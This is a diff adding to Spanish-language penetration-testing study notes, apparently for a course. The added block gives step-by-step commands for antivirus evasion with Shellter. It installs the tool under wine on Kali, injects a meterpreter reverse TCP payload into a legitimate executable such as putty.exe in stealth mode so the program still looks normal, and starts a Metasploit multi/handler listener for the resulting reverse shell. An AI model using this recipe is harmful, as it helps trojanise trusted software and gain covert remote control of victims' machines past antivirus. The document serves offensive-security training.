@@ -237,9 +237,33 @@ cat flag.txt
 - Shellter: Es una herramienta que combina varias de estas técnicas de forma automática. Toma un ejecutable legítimo de Windows (como putty.exe) e inyecta tu payload dentro de él, modificando el flujo de ejecución para que el exe legítimo funcione normal pero también ejecute tu payload. Es efectivo porque el AV ve un ejecutable conocido y confiable.
 
 ```bash
+# AV EVASION CON SHELLTER
+# Shellter inyecta un payload malicioso dentro de un ejecutable legítimo de Windows
+# El AV ve el exe legítimo (putty.exe, wincmd.exe, etc.) y no detecta el payload adentro
+# Requiere wine para correr en Kali (es una herramienta de Windows)
 
+# Instalación
+sudo dpkg --add-architecture i386   # habilitar arquitectura 32-bit (shellter es x86)
+sudo apt-get update
+sudo apt-get install wine32 -y
+sudo apt-get install shellter -y
 
+# Uso (desde la ruta donde está shellter.exe)
+sudo wine shellter.exe
 
+> A               # Modo automático (vs Manual que da más control pero es más complejo)
+> PE Target:      # Ruta del ejecutable LEGÍTIMO que vamos a infectar (ej: /root/putty.exe)
+                  # Importante: debe ser un exe de 32-bit
+> Stealth Mode: Y # El exe legítimo sigue funcionando normal — no levanta sospechas
+> L               # Usar payload de la lista predefinida (meterpreter, shell, etc.)
+> [elegir opción] # Típicamente meterpreter_reverse_tcp
+> LHOST: <ip atacante>
+> LPORT: <puerto>
+
+# Resultado: el exe original queda modificado con el payload inyectado
+# Al ejecutarlo en la víctima → funciona el programa legítimo + se abre la reverse shell
+# En Kali tener el listener activo antes de ejecutar en la víctima:
+msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <ip>; set LPORT <puerto>; run"
 ```
 
 ## 02 - Client-Side Attacks
